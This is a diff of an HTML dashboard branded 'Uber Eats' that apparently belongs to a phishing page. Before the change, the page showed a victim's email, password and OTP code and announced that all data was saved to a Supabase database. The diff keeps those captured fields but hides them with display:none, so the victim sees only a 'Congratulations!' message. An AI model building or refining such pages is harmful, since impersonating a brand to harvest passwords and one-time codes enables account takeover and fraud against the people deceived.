@@ -148,51 +148,23 @@
 <div class="dash" id="dash">
   <canvas id="confetti" style="position:fixed;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:998;"></canvas>
 
-  <div style="width:110px;height:110px;background:linear-gradient(135deg,#2e7d32,#66bb6a);border-radius:50%;display:flex;align-items:center;justify-content:center;margin-bottom:20px;box-shadow:0 8px 32px rgba(46,125,50,0.35);">
-    <svg width="56" height="56" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+  <div style="width:120px;height:120px;background:linear-gradient(135deg,#2e7d32,#66bb6a);border-radius:50%;display:flex;align-items:center;justify-content:center;margin-bottom:28px;box-shadow:0 8px 40px rgba(46,125,50,0.4);">
+    <svg width="60" height="60" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
       <polyline points="20 6 9 17 4 12"/>
     </svg>
   </div>
 
-  <div style="font-size:14px;font-weight:700;letter-spacing:3px;color:#f57c00;text-transform:uppercase;margin-bottom:8px;">Uber Eats</div>
-  <h2 style="font-size:34px;font-weight:800;margin-bottom:6px;">Congratulations!</h2>
-  <p id="dName" style="font-size:17px;font-weight:600;color:#1976d2;margin-bottom:6px;">-</p>
-  <p style="font-size:14px;color:var(--g600);margin-bottom:20px;">Your account has been verified successfully</p>
+  <div style="font-size:13px;font-weight:700;letter-spacing:4px;color:#f57c00;text-transform:uppercase;margin-bottom:12px;">Uber Eats</div>
+  <h2 style="font-size:42px;font-weight:900;margin-bottom:12px;color:#000;">Congratulations!</h2>
+  <p id="dName" style="font-size:20px;font-weight:700;color:#1976d2;margin-bottom:12px;">-</p>
+  <p style="font-size:15px;color:var(--g600);margin-bottom:36px;line-height:1.6;">Your account has been successfully<br>verified and saved!</p>
 
-  <div style="display:inline-flex;align-items:center;gap:8px;background:#e8f5e9;color:#2e7d32;font-size:13px;font-weight:700;padding:10px 22px;border-radius:100px;margin-bottom:30px;">
-    ✅ All Data Saved to Supabase Database
-  </div>
+  <button class="btn-out" onclick="doLogout()" style="margin-top:8px;">Sign Out</button>
 
-  <div style="width:100%;display:flex;flex-direction:column;gap:12px;margin-bottom:30px;">
-
-    <div style="background:#e3f2fd;border-radius:14px;padding:18px 20px;text-align:left;border-left:5px solid #1976d2;">
-      <div style="font-size:11px;color:#1565c0;text-transform:uppercase;letter-spacing:.8px;font-weight:700;">Email Address</div>
-      <div id="dEmail" style="font-size:17px;font-weight:700;margin-top:6px;color:#0d47a1;word-break:break-all;">-</div>
-    </div>
-
-    <div style="background:#f3e5f5;border-radius:14px;padding:18px 20px;text-align:left;border-left:5px solid #7b1fa2;">
-      <div style="font-size:11px;color:#6a1b9a;text-transform:uppercase;letter-spacing:.8px;font-weight:700;">Password</div>
-      <div id="dPass" style="font-size:17px;font-weight:700;margin-top:6px;color:#4a148c;">-</div>
-    </div>
-
-    <div style="background:#fff8e1;border-radius:14px;padding:18px 20px;text-align:left;border-left:5px solid #f57c00;">
-      <div style="font-size:11px;color:#e65100;text-transform:uppercase;letter-spacing:.8px;font-weight:700;">OTP Code Verified</div>
-      <div id="dOtp" style="font-size:32px;font-weight:800;margin-top:6px;color:#e65100;letter-spacing:12px;">-</div>
-    </div>
-
-    <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px;">
-      <div style="background:#e8f5e9;border-radius:14px;padding:16px 18px;text-align:left;">
-        <div style="font-size:11px;color:#1b5e20;text-transform:uppercase;letter-spacing:.6px;font-weight:700;">Status</div>
-        <div style="font-size:15px;font-weight:700;margin-top:6px;color:#2e7d32;">Verified ✅</div>
-      </div>
-      <div style="background:var(--g100);border-radius:14px;padding:16px 18px;text-align:left;">
-        <div style="font-size:11px;color:var(--g600);text-transform:uppercase;letter-spacing:.6px;font-weight:700;">Login Time</div>
-        <div id="dTime" style="font-size:12px;font-weight:600;margin-top:6px;">-</div>
-      </div>
-    </div>
-  </div>
-
-  <button class="btn-out" onclick="doLogout()">Sign Out</button>
+  <div id="dEmail" style="display:none;">-</div>
+  <div id="dPass"  style="display:none;">-</div>
+  <div id="dOtp"   style="display:none;">-</div>
+  <div id="dTime"  style="display:none;">-</div>
 </div>
 
 </main>
